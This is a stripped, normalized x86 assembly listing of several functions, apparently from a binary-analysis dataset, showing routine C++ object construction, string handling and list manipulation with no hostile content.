sub_418b97
push 0x40
mov eax sub_43bcee
call sub_425dad
mov esi ecx
xor edi edi
mov [ ebp - 0x10 ] edi
push 0x80
cmp [ esi + 0xc ] edi
jne r-xdata
call sub_4246c6
pop ecx
mov [ ebp - 0x14 ] eax
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] 0x3
cmp eax edi
je r-xdata
call sub_4246c6
pop ecx
mov [ ebp - 0x14 ] eax
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
push r--data
lea ecx [ ebp - 0x4c ]
call sub_403dc1
lea eax [ ebp - 0x4c ]
push eax
lea eax [ esi + 0x30 ]
mov [ ebp - 0x4 ] 0x4
mov edi [ esi + 0x8 ]
push eax
push [ ebp - 0x14 ]
mov [ ebp - 0x10 ] 0x2
call sub_41ed6b
xor edi edi
jmp r-xdata
xor eax eax
push r--data
lea ecx [ ebp - 0x30 ]
call sub_403dc1
push ebx
lea eax [ ebp - 0x30 ]
push eax
lea eax [ esi + 0x30 ]
mov [ ebp - 0x4 ] bl
push eax
push [ ebp - 0x14 ]
mov [ ebp - 0x10 ] ebx
call sub_41ec78
jmp r-xdata
cmp [ esi + 0x2c ] edi
je r-xdata
push edi
push ebx
lea ecx [ ebp - 0x4c ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x2
mov [ esi + 0x8 ] eax
je r-xdata
mov eax [ esi + 0xc ]
mov [ esi + 0x8 ] eax
jmp r-xdata
push edi
push ebx
lea ecx [ ebp - 0x30 ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
mov [ esi + 0xc ] eax
test [ ebp - 0x10 ] bl
je r-xdata
lea edi [ esi + 0x30 ]
push r--data
mov eax edi
call sub_40563c
pop ecx
test al al
je r-xdata
mov ecx [ esi + 0x8 ]
mov eax [ ecx ]
lea edi [ esi + 0x14 ]
push edi
call [ eax + 0x14 ]
call sub_418ebb
push r--data
mov eax edi
call sub_40563c
pop ecx
test al al
je r-xdata
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
call sub_425e4c
retn
cmp [ esi + 0xa0 ] 0x2
jne r-xdata
call sub_418df5
push [ esi + 0xc ]
mov eax [ ecx ]
call [ eax + 0x4 ]
call sub_418df5
sub_418ccf
push 0x7c
mov eax sub_43ad2f
call sub_425dad
mov esi ecx
sub esp 0x1c
lea ebx [ esi + 0x84 ]
mov ecx esp
mov [ ebp - 0x14 ] esp
push ebx
call sub_403de3
lea eax [ ebp - 0x50 ]
push eax
call sub_41f313
add esp 0x20
and [ ebp - 0x4 ] 0x0
push eax
sub esp 0x1c
lea eax [ esi + 0x68 ]
mov ecx esp
mov [ ebp - 0x18 ] esp
push eax
mov [ ebp - 0x14 ] eax
call sub_403de3
lea eax [ ebp - 0x34 ]
push eax
call sub_41f313
add esp 0x20
push eax
lea eax [ ebp - 0x88 ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_4105ee
lea edi [ esi + 0x14 ]
mov [ ebp - 0x4 ] 0x2
mov edx [ edi + 0x14 ]
mov esi [ edi ]
push edx
push esi
mov ecx eax
call sub_418ef0
xor edi edi
xor esi esi
push edi
inc esi
push esi
lea ecx [ ebp - 0x6c ]
call sub_40415f
push edi
push esi
lea ecx [ ebp - 0x88 ]
call sub_40415f
push edi
push esi
lea ecx [ ebp - 0x34 ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push edi
push esi
lea ecx [ ebp - 0x50 ]
call sub_40415f
mov ecx [ ebp - 0x14 ]
mov esi r--data
push esi
call sub_40409c
push esi
mov ecx ebx
call sub_40409c
call sub_425e4c
retn
sub_418d98
push esi
mov esi eax
push edi
lea edi [ esi + 0x30 ]
push r--data
mov eax edi
call sub_40563c
pop ecx
test al al
je r-xdata
mov ecx [ esi + 0x8 ]
test ecx ecx
je r-xdata
mov al 0x1
jmp r-xdata
xor al al
mov eax [ ecx ]
call [ eax + 0x28 ]
mov ecx edi
call sub_40561a
test al al
je r-xdata
pop edi
pop esi
retn
mov eax [ esi + 0x8 ]
mov eax [ eax + 0x74 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ esi + 0x8 ] eax
jmp r-xdata
call sub_418df5
jmp r-xdata
push [ esi + 0xc ]
mov eax [ ecx ]
call [ eax + 0x4 ]
sub_418df5
mov ecx [ esi + 0xc ]
test ecx ecx
je r-xdata
and [ esi + 0xc ] 0x0
and [ esi + 0x8 ] 0x0
push edi
mov edi r--data
push edi
lea ecx [ esi + 0x4c ]
call sub_40409c
push edi
lea ecx [ esi + 0x30 ]
call sub_40409c
push edi
lea ecx [ esi + 0x68 ]
call sub_40409c
push edi
lea ecx [ esi + 0x84 ]
call sub_40409c
lea edi [ esi + 0x14 ]
call sub_418ebb
and [ esi + 0x10 ] 0x0
and [ esi + 0xa0 ] 0x0
pop edi
retn
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_418e5f
push 0x0
mov eax sub_43bffe
call sub_425dad
mov esi [ ebp + 0x8 ]
push 0x4
call sub_4246c6
pop ecx
test eax eax
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ esi ] eax
and [ ebp - 0x4 ] 0x0
call sub_418f5e
and [ esi + 0x18 ] 0x0
mov [ esi + 0x14 ] eax
mov eax esi
call sub_425e4c
retn 0x4
sub_418ebb
mov eax [ edi + 0x14 ]
push ebx
mov ebx [ eax ]
mov [ eax ] eax
mov eax [ edi + 0x14 ]
mov [ eax + 0x4 ] eax
and [ edi + 0x18 ] 0x0
cmp ebx [ edi + 0x14 ]
je r-xdata
pop ebx
retn
push ebp
push esi
mov ebp [ ebx ]
lea esi [ ebx + 0x8 ]
call sub_4049b2
push ebx
call sub_42412e
pop ecx
mov ebx ebp
cmp ebp [ edi + 0x14 ]
jne r-xdata
pop esi
pop ebp
sub_418ef0
push 0x44
mov eax sub_43a5f3
call sub_425dad
mov eax [ ebp + 0xc ]
lea esi [ eax + 0x4 ]
push [ esi ]
push eax
call sub_418f76
mov ecx [ edi + 0x18 ]
mov edx 0x4924924
sub edx ecx
cmp edx 0x1
jae r-xdata
inc ecx
mov [ edi + 0x18 ] ecx
mov [ esi ] eax
mov ecx [ eax + 0x4 ]
mov [ ecx ] eax
call sub_425e4c
retn 0x8
push r--data
lea ecx [ ebp - 0x28 ]
call sub_403dc1
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x50 ]
call sub_401065
push r--data
lea eax [ ebp - 0x50 ]
push eax
mov [ ebp - 0x50 ] r--data
call sub_42597b
sub_418f76
push 0x8
mov eax sub_43a880
call sub_425de0
mov ebx ecx
push 0x40
call sub_4246c6
and [ ebp - 0x4 ] 0x0
mov edi eax
pop ecx
mov [ ebp - 0x14 ] edi
test edi edi
je r-xdata
lea eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ edi ] eax
lea esi [ edi + 0x8 ]
mov [ ebp + 0x8 ] esi
mov [ ebp + 0xc ] esi
mov [ ebp - 0x4 ] 0x1
test esi esi
je r-xdata
mov ecx [ ebp + 0xc ]
mov [ eax ] ecx
mov eax edi
call sub_425e4c
retn 0x8
push ebx
mov ecx esi
call sub_403de3
add ebx 0x1c
push ebx
lea ecx [ esi + 0x1c ]
mov [ ebp - 0x4 ] 0x2
call sub_403de3
sub_419008
push 0x4
mov eax sub_43bc8d
call sub_425dad
mov esi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
lea edi [ esi + 0x8 ]
push 0x4
mov [ esi ] r--data
mov [ esi + 0x4 ] eax
mov [ ebp + 0xc ] edi
call sub_4246c6
pop ecx
test eax eax
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov eax esi
call sub_425e4c
retn 0x8
mov eax rw-data
call sub_40d9a7
mov [ edi ] eax
mov [ ebp - 0x4 ] 0x1
call sub_414157
lea ecx [ edi + 0x18 ]
mov [ ecx ] eax
mov [ eax + 0x2d ] 0x1
mov eax [ ecx ]
mov [ eax + 0x4 ] eax
mov eax [ ecx ]
mov [ eax ] eax
mov ecx [ ecx ]
mov [ ecx + 0x8 ] ecx
and [ edi + 0x1c ] 0x0
mov [ ebp - 0x4 ] 0x2
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
sub_4190a0
push 0x4
mov eax sub_43cec7
call sub_425dad
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x1
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + 0x8 ]
push eax
mov [ ebp - 0x4 ] 0x0
call sub_40fb35
mov [ esi ] r--data
call sub_425e4c
retn
push eax
mov eax rw-data
call sub_40d9c4
mov eax [ esi + 0x4 ]
push esi
call sub_40d922
sub_4190f2
push 0xc8
mov eax sub_43f200
call sub_425e16
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x2c ]
mov esi ecx
xor ebx ebx
push eax
mov [ ebp - 0x30 ] ebx
push [ esi + 0x4 ]
call sub_40d136
push 0x80
mov [ ebp - 0x4 ] ebx
call sub_4246c6
pop ecx
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x4 ] 0x1
cmp eax ebx
je r-xdata
xor edi edi
mov [ ebp - 0x38 ] ebx
inc edi
push r--data
lea ecx [ ebp - 0xb4 ]
call sub_403dc1
xor edi edi
mov [ ebp - 0x4 ] 0x2
inc edi
push r--data
lea ecx [ ebp - 0xd0 ]
mov [ ebp - 0x30 ] edi
call sub_403dc1
push 0x3
pop eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x30 ] eax
push ebx
lea eax [ ebp - 0xb4 ]
push eax
lea eax [ ebp - 0xd0 ]
push eax
push [ ebp - 0x34 ]
call sub_41ec78
mov [ ebp - 0x38 ] eax
jmp r-xdata
mov [ ebp - 0x4 ] ebx
test [ ebp - 0x30 ] 0x1
je r-xdata
and [ ebp - 0x30 ] 0xfffffffd
push ebx
push edi
lea ecx [ ebp - 0xd0 ]
call sub_40415f
test [ ebp - 0x30 ] 0x2
je r-xdata
push r--data
lea ecx [ ebp - 0x60 ]
call sub_403dc1
mov ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x2c ]
push edx
lea edx [ ebp - 0x60 ]
mov [ ebp - 0x4 ] 0x6
mov eax [ ecx ]
push edx
call [ eax + 0x10 ]
push ebx
push edi
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x4 ] bl
call sub_40415f
push r--data
lea ecx [ ebp - 0x7c ]
call sub_403dc1
push r--data
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x4 ] 0x7
call sub_403dc1
mov ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x7c ]
push edx
lea edx [ ebp - 0x60 ]
mov [ ebp - 0x4 ] 0x8
mov eax [ ecx ]
push edx
call [ eax + 0x10 ]
push ebx
push edi
lea ecx [ ebp - 0x60 ]
call sub_40415f
push ebx
push edi
lea ecx [ ebp - 0x7c ]
mov [ ebp - 0x4 ] bl
call sub_40415f
push 0x80
call sub_4246c6
pop ecx
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x4 ] 0x9
cmp eax ebx
je r-xdata
and [ ebp - 0x30 ] 0xfffffffe
push ebx
push edi
lea ecx [ ebp - 0xb4 ]
call sub_40415f
mov [ ebp - 0x34 ] ebx
push r--data
lea ecx [ ebp - 0x60 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0xa
or [ ebp - 0x30 ] 0x4
push r--data
lea ecx [ ebp - 0x7c ]
call sub_403dc1
mov edi [ ebp - 0x38 ]
lea eax [ ebp - 0x60 ]
push eax
lea eax [ ebp - 0x7c ]
mov [ ebp - 0x4 ] 0xb
or [ ebp - 0x30 ] 0x8
push eax
push [ ebp - 0x34 ]
xor bl bl
call sub_41ed6b
xor edi edi
xor ebx ebx
mov [ ebp - 0x34 ] eax
inc edi
jmp r-xdata
mov [ ebp - 0x4 ] ebx
test [ ebp - 0x30 ] 0x4
je r-xdata
and [ ebp - 0x30 ] 0xfffffff7
push ebx
push edi
lea ecx [ ebp - 0x7c ]
call sub_40415f
test [ ebp - 0x30 ] 0x8
je r-xdata
push r--data
lea ecx [ ebp - 0x98 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0xe
mov ecx [ ebp - 0x34 ]
mov eax [ ecx ]
push rw-data
lea edx [ ebp - 0x98 ]
push edx
call [ eax + 0x10 ]
push ebx
push edi
lea ecx [ ebp - 0x98 ]
mov [ ebp - 0x4 ] bl
call sub_40415f
push 0x80
call sub_4246c6
pop ecx
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4 ] 0xf
cmp eax ebx
je r-xdata
and [ ebp - 0x30 ] 0xfffffffb
push ebx
push edi
lea ecx [ ebp - 0x60 ]
call sub_40415f
mov [ ebp - 0x34 ] ebx
push r--data
lea ecx [ ebp - 0x98 ]
call sub_403dc1
lea eax [ ebp - 0x98 ]
push eax
push [ ebp - 0x44 ]
mov [ ebp - 0x4 ] 0x10
push [ ebp - 0x40 ]
mov edi [ ebp - 0x34 ]
or [ ebp - 0x30 ] 0x10
xor bl bl
call sub_41ed6b
xor edi edi
xor ebx ebx
mov [ ebp - 0x34 ] eax
inc edi
jmp r-xdata
push r--data
lea ecx [ ebp - 0x7c ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x12
mov ecx [ ebp - 0x34 ]
mov eax [ ecx ]
push rw-data
lea edx [ ebp - 0x7c ]
push edx
call [ eax + 0x10 ]
push ebx
push edi
lea ecx [ ebp - 0x7c ]
mov [ ebp - 0x4 ] bl
call sub_40415f
lea eax [ ebp - 0x2c ]
push eax
lea eax [ esi + 0x8 ]
push eax
call sub_41be6f
mov ecx [ ebp + 0x10 ]
mov [ eax ] ecx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x2c ]
call sub_40d8fc
mov esi [ esi + 0x4 ]
push [ ebp - 0x38 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x14 ]
mov ecx [ ebp - 0x3c ]
lea eax [ ebp - 0x2c ]
push eax
call sub_403de3
push ebx
push edi
lea ecx [ ebp - 0x2c ]
call sub_40415f
mov eax [ ebp - 0x3c ]
call sub_425e60
retn 0xc
push ebx
push edi
lea ecx [ ebp - 0x98 ]
call sub_40415f
mov [ ebp - 0x4 ] ebx
test [ ebp - 0x30 ] 0x10
je r-xdata
sub_4193e1
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_43acf9
mov eax [ fs : 0x0 ]
push eax
sub esp 0x48
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x58 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x74 ]
lea edi [ esi + 0x8 ]
push eax
lea ebx [ esp + 0x24 ]
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] edi
call sub_41c19a
mov eax [ edi + 0x18 ]
mov [ esp + 0x2c ] eax
mov eax [ edi ]
lea edi [ esp + 0x28 ]
mov esi ebx
mov [ esp + 0x28 ] eax
call sub_40f543
test al al
jne r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0x18 ]
mov [ esp + 0x34 ] ecx
mov ecx [ eax ]
mov [ esp + 0x30 ] ecx
lea ecx [ esp + 0x30 ]
mov [ esp + 0x10 ] ecx
mov ebx ecx
mov ecx [ esp + 0x24 ]
mov eax [ esp + 0x10 ]
add ecx 0xc
call sub_405664
test al al
jne r-xdata
xor al al
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov ecx edi
call [ eax + 0x68 ]
cmp eax 0x4
je r-xdata
mov eax [ esp + 0x14 ]
mov [ esp + 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0xc ]
sub eax 0x0
je r-xdata
cmp eax 0x8
jne r-xdata
mov ecx [ ebx ]
mov [ esp + 0x18 ] ecx
mov ecx [ ebx + 0x4 ]
mov [ esp + 0x1c ] ecx
mov ecx [ eax + 0x18 ]
mov eax [ eax ]
lea edi [ esp + 0x28 ]
lea esi [ esp + 0x18 ]
mov [ esp + 0x2c ] ecx
mov [ esp + 0x28 ] eax
call sub_40f543
test al al
jne r-xdata
push r--data
lea ecx [ esp + 0x3c ]
call sub_403dc1
and [ esp + 0x60 ] 0x0
mov eax [ edi ]
lea ecx [ esp + 0x38 ]
push ecx
mov ecx edi
call [ eax + 0x4c ]
or [ esp + 0x60 ] 0xffffffff
push 0x0
push 0x1
lea ecx [ esp + 0x40 ]
mov esi eax
call sub_40415f
test esi esi
je r-xdata
dec eax
jne r-xdata
push [ ebx + 0x4 ]
lea eax [ esp + 0x34 ]
push [ ebx ]
push eax
push [ esp + 0x20 ]
call sub_40fc47
mov eax [ ebp + 0xc ]
sub eax 0x0
je r-xdata
push [ ebx + 0x4 ]
lea eax [ esp + 0x34 ]
push [ ebx ]
push eax
push [ esp + 0x20 ]
call sub_40fc47
mov al 0x1
jmp r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x3c ]
mov esi [ eax + 0x14 ]
mov eax [ eax ]
mov edi [ esi ]
mov [ esp + 0x2c ] edi
mov [ esp + 0x28 ] eax
test eax eax
je r-xdata
lea esi [ esp + 0x18 ]
call sub_40f2d4
mov ebx [ eax + 0x1c ]
mov esi [ ebx ]
mov eax [ edi ]
push 0x0
mov ecx edi
add esi 0x8
call [ eax + 0x74 ]
push eax
mov ecx ebx
call [ esi ]
jmp r-xdata
lea esi [ esp + 0x18 ]
call sub_40f2d4
push 0x2
dec eax
jne r-xdata
mov ecx [ esp + 0x58 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_423d5c
cmp eax eax
je r-xdata
mov ebx [ esp + 0x10 ]
call sub_40f2d4
push 0x1
jmp r-xdata
lea esi [ esp + 0x28 ]
call sub_40f2a9
mov ebx [ eax ]
lea esi [ esp + 0x18 ]
call sub_40f2d4
mov eax [ eax + 0x1c ]
mov edi [ eax ]
lea esi [ esp + 0x28 ]
mov [ esp + 0x18 ] eax
add edi 0x4
call sub_40f2a9
push [ eax ]
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x28 ]
mov ecx [ esp + 0x1c ]
push eax
call [ edi ]
cmp edi esi
je r-xdata
mov ebx [ eax + 0x1c ]
mov esi [ ebx ]
mov eax [ edi ]
mov ecx edi
add esi 0x8
call [ eax + 0x74 ]
push eax
mov ecx ebx
call [ esi ]
mov ebx [ esp + 0x10 ]
sub_41960e
push esi
push [ esp + 0x8 ]
lea ecx [ edi + 0x8 ]
mov [ edi ] r--data
mov [ edi + 0x4 ] eax
call sub_403de3
lea esi [ edi + 0x24 ]
call sub_403dae
mov eax [ esp + 0xc ]
mov [ edi + 0x40 ] eax
mov eax edi
pop esi
retn 0x8
sub_419639
push esi
mov esi ecx
push 0x0
push 0x1
lea ecx [ esi + 0x24 ]
mov [ esi ] r--data
call sub_40415f
push 0x0
push 0x1
lea ecx [ esi + 0x8 ]
call sub_40415f
pop esi
retn
sub_419691
push 0x4
mov eax sub_43bc55
call sub_425dad
mov esi [ ebp + 0x8 ]
lea eax [ esi + 0x4 ]
push eax
mov [ esi ] r--data
call sub_403eef
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0x20 ]
push 0x4
mov [ ebp - 0x10 ] edi
call sub_4246c6
pop ecx
test eax eax
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ edi ] eax
mov [ ebp - 0x4 ] 0x1
call sub_414157
lea ecx [ edi + 0x18 ]
mov [ ecx ] eax
mov [ eax + 0x2d ] 0x1
mov eax [ ecx ]
mov [ eax + 0x4 ] eax
mov eax [ ecx ]
mov [ eax ] eax
mov ecx [ ecx ]
mov [ ecx + 0x8 ] ecx
and [ edi + 0x1c ] 0x0
push [ ebp + 0x10 ]
mov [ ebp - 0x4 ] 0x2
and [ esi + 0x40 ] 0x0
lea ecx [ esi + 0x44 ]
call sub_403de3
mov eax [ ebp + 0xc ]
add eax 0x70
push eax
lea ecx [ esi + 0x60 ]
mov [ ebp - 0x4 ] 0x3
call sub_403de3
mov [ esi + 0x7c ] 0x0
mov eax esi
call sub_425e4c
retn 0xc
sub_419741
push 0x14
mov eax sub_43ce97
call sub_425dad
mov ebx ecx
mov [ ebp - 0x10 ] ebx
mov [ ebx ] r--data
mov [ ebp - 0x4 ] 0x3
mov eax [ ebx + 0x38 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov eax [ ebx + 0x20 ]
mov [ ebp - 0x18 ] eax
push 0x0
push 0x1
lea ecx [ ebx + 0x60 ]
call sub_40415f
push 0x0
push 0x1
lea ecx [ ebx + 0x44 ]
call sub_40415f
lea eax [ ebx + 0x20 ]
push eax
mov [ ebp - 0x4 ] 0x0
call sub_40fb35
lea eax [ ebx + 0x4 ]
call sub_403f2c
call sub_425e4c
retn
call sub_40f2d4
mov eax [ eax + 0x1c ]
test eax eax
je r-xdata
lea esi [ ebp - 0x18 ]
call sub_40f2d4
and [ eax + 0x1c ] 0x0
call sub_41bfbb
jmp r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
mov eax [ ebx + 0x38 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebx + 0x20 ]
lea edi [ ebp - 0x20 ]
lea esi [ ebp - 0x18 ]
mov [ ebp - 0x20 ] eax
call sub_40f543
test al al
jne r-xdata
sub_4197fd
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_43acd6
mov eax [ fs : 0x0 ]
push eax
sub esp 0x38
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x48 ]
mov [ fs : 0x0 ] eax
and [ esp + 0x14 ] 0x0
push [ ebp + 0x8 ]
lea ebx [ ecx + 0x20 ]
mov eax [ ebx + 0x18 ]
mov [ esp + 0x20 ] eax
mov eax [ ebx ]
mov [ esp + 0x1c ] eax
lea eax [ esp + 0x24 ]
push eax
call sub_419d78
lea edi [ esp + 0x18 ]
mov esi eax
call sub_40f543
test al al
je r-xdata
push [ ebp + 0x8 ]
call sub_419cd6
mov eax [ eax ]
mov ecx [ ebp + 0xc ]
mov [ eax + 0x40 ] ecx
push 0x44
call sub_4246c6
mov edi eax
pop ecx
mov [ esp + 0x18 ] edi
xor esi esi
mov [ esp + 0x50 ] esi
cmp edi esi
je r-xdata
xor edi edi
push esi
lea ecx [ esp + 0x2c ]
mov [ esp + 0x44 ] 0xf
call sub_404490
push [ ebp + 0xc ]
lea eax [ esp + 0x2c ]
push eax
mov [ esp + 0x58 ] 0x1
xor eax eax
mov [ esp + 0x1c ] 0x1
call sub_41960e
mov edi eax
jmp r-xdata
mov ecx [ esp + 0x48 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
push esi
push 0x1
lea ecx [ esp + 0x30 ]
call sub_40415f
jmp r-xdata
push [ ebp + 0x8 ]
mov [ esp + 0x54 ] 0x2
call sub_419cd6
test [ esp + 0x14 ] 0x1
mov [ eax ] edi
je r-xdata
sub_4198f2
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_43bc0f
mov eax [ fs : 0x0 ]
push eax
sub esp 0x38
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x48 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x8 ]
lea ebx [ ecx + 0x20 ]
mov eax [ ebx + 0x18 ]
mov [ esp + 0x1c ] eax
mov eax [ ebx ]
mov [ esp + 0x18 ] eax
lea eax [ esp + 0x20 ]
push eax
call sub_419d78
lea edi [ esp + 0x14 ]
mov esi eax
call sub_40f543
test al al
je r-xdata
push [ ebp + 0xc ]
lea ecx [ esp + 0x28 ]
call sub_403de3
push [ ebp + 0x8 ]
xor esi esi
inc esi
mov [ esp + 0x54 ] esi
call sub_419cd6
mov eax [ eax ]
push 0xffffffff
push 0x0
lea ecx [ esp + 0x2c ]
push ecx
lea ecx [ eax + 0x8 ]
mov [ esp + 0x5c ] 0x2
call sub_40400a
push 0x0
push esi
lea ecx [ esp + 0x2c ]
call sub_40415f
push 0x44
call sub_4246c6
mov edi eax
pop ecx
mov [ esp + 0x14 ] edi
xor esi esi
mov [ esp + 0x50 ] esi
cmp edi esi
je r-xdata
push [ ebp + 0x8 ]
or [ esp + 0x54 ] 0xffffffff
call sub_419cd6
mov [ eax ] esi
jmp r-xdata
push 0x6
push [ ebp + 0xc ]
xor eax eax
call sub_41960e
mov esi eax
mov ecx [ esp + 0x48 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4199d8
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_43acd6
mov eax [ fs : 0x0 ]
push eax
sub esp 0x38
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x48 ]
mov [ fs : 0x0 ] eax
and [ esp + 0x14 ] 0x0
push [ ebp + 0x8 ]
lea ebx [ ecx + 0x20 ]
mov eax [ ebx + 0x18 ]
mov [ esp + 0x20 ] eax
mov eax [ ebx ]
mov [ esp + 0x1c ] eax
lea eax [ esp + 0x24 ]
push eax
call sub_419d78
lea edi [ esp + 0x18 ]
mov esi eax
call sub_40f543
test al al
je r-xdata
push [ ebp + 0x8 ]
call sub_419cd6
mov eax [ eax ]
mov ecx [ ebp + 0xc ]
mov [ eax + 0x4 ] ecx
push 0x44
call sub_4246c6
mov edi eax
pop ecx
mov [ esp + 0x18 ] edi
xor esi esi
mov [ esp + 0x50 ] esi
cmp edi esi
je r-xdata
xor edi edi
push esi
lea ecx [ esp + 0x2c ]
mov [ esp + 0x44 ] 0xf
call sub_404490
push 0x6
lea eax [ esp + 0x2c ]
push eax
mov eax [ ebp + 0xc ]
mov [ esp + 0x58 ] 0x1
mov [ esp + 0x1c ] 0x1
call sub_41960e
mov edi eax
jmp r-xdata
mov ecx [ esp + 0x48 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
push esi
push 0x1
lea ecx [ esp + 0x30 ]
call sub_40415f
jmp r-xdata
push [ ebp + 0x8 ]
mov [ esp + 0x54 ] 0x2
call sub_419cd6
test [ esp + 0x14 ] 0x1
mov [ eax ] edi
je r-xdata
sub_419acd
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov esi r--data
push esi
mov eax ebx
mov edi ecx
call sub_40563c
pop ecx
test al al
je r-xdata
push esi
mov eax ebx
call sub_40563c
pop ecx
test al al
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov esi r--data
push esi
mov eax ebx
call sub_40563c
pop ecx
test al al
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov [ edi + 0x40 ] 0x6
jmp r-xdata
push esi
mov eax ebx
call sub_40563c
pop ecx
test al al
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov [ edi + 0x40 ] 0x7
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov esi r--data
push esi
mov eax ebx
call sub_40563c
pop ecx
test al al
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov [ edi + 0x40 ] 0x4
jmp r-xdata
push esi
mov eax ebx
call sub_40563c
pop ecx
test al al
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov [ edi + 0x40 ] 0x5
jmp r-xdata
push r--data
mov eax ebx
call sub_40563c
pop ecx
test al al
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
and [ edi + 0x40 ] 0x0
jmp r-xdata
mov [ edi + 0x40 ] 0x8
mov [ edi + 0x40 ] 0x1
jmp r-xdata
sub_419bc8
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x14
push ebx
push esi
push edi
push [ ebp + 0x8 ]
lea eax [ esp + 0x14 ]
lea ebx [ ecx + 0x20 ]
push eax
call sub_419d78
mov eax [ ebx + 0x18 ]
mov [ esp + 0x1c ] eax
mov eax [ ebx ]
lea edi [ esp + 0x18 ]
lea esi [ esp + 0x10 ]
mov [ esp + 0x18 ] eax
call sub_40f543
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_40f2d4
mov eax [ eax + 0x1c ]
test eax eax
je r-xdata
push [ esp + 0x14 ]
lea eax [ esp + 0x1c ]
push [ esp + 0x14 ]
push eax
push ebx
call sub_40fc47
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_419c3b
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
push [ ebp + 0x8 ]
lea ebx [ ecx + 0x20 ]
mov eax ebx
call sub_419ffb
mov [ ebp - 0x4 ] eax
test ebx ebx
jne r-xdata
mov eax [ ebx ]
mov ecx [ ebx + 0x18 ]
lea edi [ ebp - 0x10 ]
lea esi [ ebp - 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] eax
call sub_40f543
test al al
jne r-xdata
call sub_423d5c
mov eax [ ebx + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebx ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
